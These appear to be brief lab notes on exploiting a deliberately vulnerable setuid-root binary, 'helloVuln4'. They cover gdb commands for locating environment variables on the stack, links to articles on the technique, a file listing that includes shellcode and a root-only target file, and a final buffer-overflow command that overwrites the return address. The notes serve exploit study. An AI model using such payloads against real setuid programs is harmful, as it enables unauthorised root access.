gdb show environment


x/60s *((char **)environ)

x/s *((char **)environ)
x/s *((char **)environ + 1)



https://security.stackexchange.com/questions/13194/finding-environment-variables-with-gdb-to-exploit-a-buffer-overflow
https://shankaraman.wordpress.com/2015/06/07/finding-the-environment-variables-on-the-stack/
total 40



## this is the file perms and setuid status

-rw-r--r-- 1 cicorias cicorias   450 Mar 13 11:44 helloVuln4.c
-rwsr-xr-x 1 root     root     10040 Mar 13 11:39 helloVuln4
drwx------ 2 cicorias cicorias  4096 Mar 13 11:39 .
-rwx------ 1 root     root        30 Mar 13 11:36 hidden-root.txt
-rw-r--r-- 1 cicorias cicorias   320 Mar 13 11:26 makefile
-rw-rw-r-- 1 cicorias cicorias   317 Mar  3 18:45 NOTE.md
drwxrwxr-x 8 cicorias cicorias  4096 Feb 21 14:16 ..
-rw-r--r-- 1 cicorias cicorias    25 Feb 21 14:16 shell.bin


./helloVuln4 $(perl -e 'print "A"x28 . "\xd1\xdf\xff\xff"')
